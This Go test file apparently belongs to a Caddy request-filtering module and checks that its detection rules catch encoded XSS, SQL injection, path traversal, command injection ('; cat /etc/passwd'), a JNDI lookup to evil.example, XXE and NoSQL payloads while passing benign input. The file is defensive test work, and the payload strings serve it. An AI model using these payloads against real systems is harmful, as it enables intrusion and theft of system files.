// Copyright 2015 Matthew Holt and The Caddy Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package requestguard

import "testing"

func TestNormalizeForms(t *testing.T) {
	for i, tc := range []struct {
		name     string
		input    string
		wantRule string // rule expected to match, empty for none
	}{
		{
			name:     "plain script tag",
			input:    `<script>alert(1)</script>`,
			wantRule: "xss-tag",
		},
		{
			name:     "uppercase script tag",
			input:    `<SCRIPT>alert(1)</SCRIPT>`,
			wantRule: "xss-tag",
		},
		{
			name:     "percent encoded script tag",
			input:    `%3Cscript%3Ealert(1)%3C%2Fscript%3E`,
			wantRule: "xss-tag",
		},
		{
			name:     "double encoded script tag",
			input:    `%253Cscript%253E`,
			wantRule: "xss-tag",
		},
		{
			name:     "html entities",
			input:    `&lt;script&gt;alert(1)&lt;/script&gt;`,
			wantRule: "xss-tag",
		},
		{
			name:     "whitespace inserted inside tag",
			input:    "<scr ipt>alert(1)</scr ipt>",
			wantRule: "xss-tag", // compacting removes the inserted space
		},
		{
			name:     "control characters around tag",
			input:    "\x00\x01<script>\x02alert(1)",
			wantRule: "xss-tag",
		},
		{
			name:     "union select with comment obfuscation",
			input:    "1 UNION/**/SELECT password FROM users",
			wantRule: "sqli-union",
		},
		{
			name:     "union select with mixed case and whitespace",
			input:    "1 UnIoN    AlL   SeLeCt 1,2,3",
			wantRule: "sqli-union",
		},
		{
			name:     "boolean injection",
			input:    "' OR 1=1 --",
			wantRule: "sqli-boolean",
		},
		{
			name:     "quoted tautology",
			input:    `'x' or 'a'='a`,
			wantRule: "sqli-quoted",
		},
		{
			name:     "path traversal encoded",
			input:    `%2e%2e%2f%2e%2e%2fsecret`,
			wantRule: "path-traversal",
		},
		{
			name:     "sensitive file",
			input:    `/etc/passwd`,
			wantRule: "path-sensitive-file",
		},
		{
			name:     "command injection",
			input:    `; cat /etc/passwd`,
			wantRule: "cmd-inject",
		},
		{
			name:     "jndi",
			input:    `${jndi:ldap://evil.example/a}`,
			wantRule: "jndi-lookup",
		},
		{
			name:     "xxe",
			input:    `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
			wantRule: "xxe",
		},
		{
			name:     "nosql",
			input:    `{"$where": "this.a == this.b"}`,
			wantRule: "nosql-operator",
		},
		{
			name:     "benign text",
			input:    "the quick brown fox jumps over the lazy dog",
			wantRule: "",
		},
		{
			name:     "benign email",
			input:    "user@example.com",
			wantRule: "",
		},
		{
			name:     "benign json",
			input:    `{"name":"Alice","age":30,"tags":["a","b"]}`,
			wantRule: "",
		},
		{
			name:     "malformed percent escapes are tolerated",
			input:    "100%25 sure %zz %",
			wantRule: "",
		},
	} {
		rules, err := compileRules(builtinRules, nil, false)
		if err != nil {
			t.Fatalf("compiling built-in rules: %v", err)
		}
		m, ok := rules.find(tc.input, targetBody)
		if tc.wantRule == "" {
			if ok {
				t.Errorf("Test %d (%s): unexpected match %q for %q", i, tc.name, m.ruleID, tc.input)
			}
			continue
		}
		if !ok {
			t.Errorf("Test %d (%s): expected match %q for %q", i, tc.name, tc.wantRule, tc.input)
			continue
		}
		if m.ruleID != tc.wantRule {
			t.Errorf("Test %d (%s): got rule %q, want %q", i, tc.name, m.ruleID, tc.wantRule)
		}
	}
}

func TestCompileRulesRejectsBadConfig(t *testing.T) {
	for i, tc := range []struct {
		name    string
		custom  []ruleConfig
		wantErr bool
	}{
		{
			name:    "missing id",
			custom:  []ruleConfig{{Pattern: "x"}},
			wantErr: true,
		},
		{
			name:    "missing pattern",
			custom:  []ruleConfig{{ID: "a"}},
			wantErr: true,
		},
		{
			name:    "invalid regexp",
			custom:  []ruleConfig{{ID: "a", Pattern: "("}},
			wantErr: true,
		},
		{
			name:    "duplicate id",
			custom:  []ruleConfig{{ID: "a", Pattern: "x"}, {ID: "a", Pattern: "y"}},
			wantErr: true,
		},
		{
			name:    "unknown target",
			custom:  []ruleConfig{{ID: "a", Pattern: "x", Targets: []string{"nope"}}},
			wantErr: true,
		},
		{
			name:    "valid custom rule",
			custom:  []ruleConfig{{ID: "a", Pattern: "x", Targets: []string{"query", "body"}}},
			wantErr: false,
		},
	} {
		_, err := compileRules(builtinRules, tc.custom, false)
		if tc.wantErr && err == nil {
			t.Errorf("Test %d (%s): expected error, got none", i, tc.name)
		}
		if !tc.wantErr && err != nil {
			t.Errorf("Test %d (%s): unexpected error: %v", i, tc.name, err)
		}
	}
}

func TestDisabledRulesAreRemoved(t *testing.T) {
	var active []rule
	for _, r := range builtinRules {
		if r.id == "xss-tag" {
			continue
		}
		active = append(active, r)
	}
	rules, err := compileRules(active, nil, false)
	if err != nil {
		t.Fatalf("compiling rules: %v", err)
	}
	if _, ok := rules.find(`<script>`, targetBody); ok {
		t.Error("disabled rule xss-tag still matched")
	}
	// a different rule must still work
	if _, ok := rules.find(`1 union select 2`, targetBody); !ok {
		t.Error("enabled rule sqli-union did not match")
	}
}

func TestRuleTargets(t *testing.T) {
	custom := []ruleConfig{
		{ID: "only-body", Pattern: `needle`, Targets: []string{"body"}},
	}
	rules, err := compileRules(nil, custom, true)
	if err != nil {
		t.Fatalf("compiling rules: %v", err)
	}
	if _, ok := rules.find("needle", targetBody); !ok {
		t.Error("rule did not match its target")
	}
	if _, ok := rules.find("needle", targetQuery); ok {
		t.Error("rule matched a target it does not apply to")
	}
}

func TestSquashCommentBecomesSpace(t *testing.T) {
	// a block comment inside SQL must not merge two tokens into one; the
	// squashed form separates them so "union select" stays visible.
	got := squash("union/**/select", true)
	if got != "union select" {
		t.Errorf("comment did not become a space: got %q", got)
	}
	compact := squash("union/**/select", false)
	if compact != "unionselect" {
		t.Errorf("compacted form: got %q", compact)
	}
}
